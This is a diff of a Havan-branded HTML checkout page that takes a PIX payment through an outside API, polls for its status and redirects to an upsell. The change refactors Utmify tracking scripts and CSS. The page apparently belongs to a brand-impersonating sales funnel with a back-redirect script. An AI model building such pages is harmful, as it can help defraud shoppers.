@@ -12,20 +12,35 @@
     <script src="env-config.php"></script>
     <script>
         window.pixelId = window.ENV_PIXEL_ID || "67c65ea78480a2789186da08";
-        console.log("Utmify Pixel ID:", window.pixelId);
+        console.log("[UTMIFY] Pixel ID:", window.pixelId);
         
-        var a = document.createElement("script");
-        a.setAttribute("async", "");
-        a.setAttribute("defer", "");
-        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-        document.head.appendChild(a);
+        (function() {
+            var a = document.createElement("script");
+            a.async = true;
+            a.defer = true;
+            a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+            document.head.appendChild(a);
+            
+            var b = document.createElement("script");
+            b.async = true;
+            b.defer = true;
+            b.src = "https://cdn.utmify.com.br/scripts/utms/latest.js";
+            b.setAttribute("data-utmify-prevent-subids", "");
+            document.head.appendChild(b);
+        })();
+
+        // Função global para disparar eventos Utmify com segurança
+        window.trackUtmify = function(eventName, data) {
+            console.log(`[UTMIFY] Tentando disparar evento: ${eventName}`, data);
+            if (window.utmify && typeof window.utmify.sendEvent === 'function') {
+                window.utmify.sendEvent(eventName, data);
+                console.log(`[UTMIFY] Evento ${eventName} enviado com sucesso!`);
+            } else {
+                console.warn(`[UTMIFY] Script não carregado. Agendando nova tentativa para ${eventName}...`);
+                setTimeout(() => window.trackUtmify(eventName, data), 2000);
+            }
+        };
     </script>
-    <script
-        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-        data-utmify-prevent-subids
-        async
-        defer
-    ></script>
 
     <!-- Back Redirect Script -->
     <script>
@@ -57,72 +72,13 @@
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
-        
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            margin: 0;
-            padding: 0;
-        }
-        
-        .havan-header {
-            background-color: #003399;
-            border-bottom: 4px solid #ffcc00;
-        }
-        
-        .havan-card {
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        
-        .notification-popup {
-            position: fixed;
-            top: 20px;
-            right: -300px;
-            background-color: #28a745;
-            color: white;
-            padding: 16px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            z-index: 1000;
-            transition: right 0.3s ease-in-out;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .notification-popup.show {
-            right: 20px;
-        }
-
-        /* Estilos do Cartão Customizado */
-        .cartao-container {
-            position: relative;
-            display: inline-block;
-            width: 100%;
-            max-width: 350px;
-            margin: 0 auto;
-        }
-
-        .cartao {
-            width: 100%;
-            aspect-ratio: 1.75 / 1;
-            border-radius: 15px;
-            background: #002279;
-            color: white;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-            font-family: Arial, sans-serif;
-            position: relative;
-            overflow: hidden;
-            margin: 0 auto;
-        }
-
+        body { font-family: 'Montserrat', sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 0; }
+        .havan-header { background-color: #003399; border-bottom: 4px solid #ffcc00; }
+        .havan-card { border-radius: 12px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); overflow: hidden; }
+        .notification-popup { position: fixed; top: 20px; right: -300px; background-color: #28a745; color: white; padding: 16px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); z-index: 1000; transition: right 0.3s ease-in-out; display: flex; align-items: center; gap: 8px; }
+        .notification-popup.show { right: 20px; }
+        .cartao-container { position: relative; display: inline-block; width: 100%; max-width: 350px; margin: 0 auto; }
+        .cartao { width: 100%; aspect-ratio: 1.75 / 1; border-radius: 15px; background: #002279; color: white; padding: 20px; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); font-family: Arial, sans-serif; position: relative; overflow: hidden; margin: 0 auto; }
         .imagem-chip { width: 35px; position: absolute; top: 40%; left: 15px; transform: translateY(-50%); }
         .imagem-lateral { width: 30px; position: absolute; top: 40%; left: 60px; transform: translateY(-50%); }
         .top-left-text { position: absolute; top: 15px; left: 15px; width: 50px; }
@@ -134,13 +90,7 @@
         .texto-label { font-size: 10px; text-transform: uppercase; color: rgba(255, 255, 255, 0.8); margin-bottom: 2px; }
         .nome-titular { font-size: 14px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
         .data-valido { font-size: 12px; font-weight: bold; }
-
-        .resumo-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px dashed #e5e7eb;
-        }
+        .resumo-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #e5e7eb; }
         .resumo-item:last-child { border-bottom: none; }
     </style>
 </head>
@@ -261,7 +211,6 @@
         const API_URL = 'https://www.pagamentos-seguros.app/api-pix/OSS7n1_UVPInD6FtO3fWz1U5TaJzycMEVQPCHOwpu2auZ51pABGdX1MpcRUUwZxQE4zvexNSomX6Fat34HoeqA';
         const REDIRECT_URL = 'pos/upsell/01/index.html';
         const AMOUNT = 2882;
-        
         let pixCode = null;
         let transactionId = null;
 
@@ -308,10 +257,8 @@
                     renderQRCode(pixCode);
                     setInterval(checkStatus, 5000);
 
-                    // Disparo Utmify
-                    if (window.utmify && window.utmify.sendEvent) {
-                        window.utmify.sendEvent('checkout', { value: AMOUNT / 100, method: 'PIX', transactionId: transactionId });
-                    }
+                    // Disparo Utmify - Checkout
+                    window.trackUtmify('checkout', { value: AMOUNT / 100, method: 'PIX', transactionId: transactionId });
                 }
             } catch (error) { console.error(error); }
         }
@@ -322,9 +269,9 @@
                 const response = await fetch(`${API_URL}?transactionId=${transactionId}`);
                 const result = await response.json();
                 if (result.status === 'COMPLETED') {
-                    if (window.utmify && window.utmify.sendEvent) {
-                        window.utmify.sendEvent('purchase', { value: AMOUNT / 100, transactionId: transactionId });
-                    }
+                    // Disparo Utmify - Purchase
+                    window.trackUtmify('purchase', { value: AMOUNT / 100, transactionId: transactionId });
+                    
                     document.getElementById('paymentPage').classList.add('hidden');
                     document.getElementById('successPage').classList.remove('hidden');
                     setTimeout(() => { window.location.replace(REDIRECT_URL + window.location.search); }, 2000);
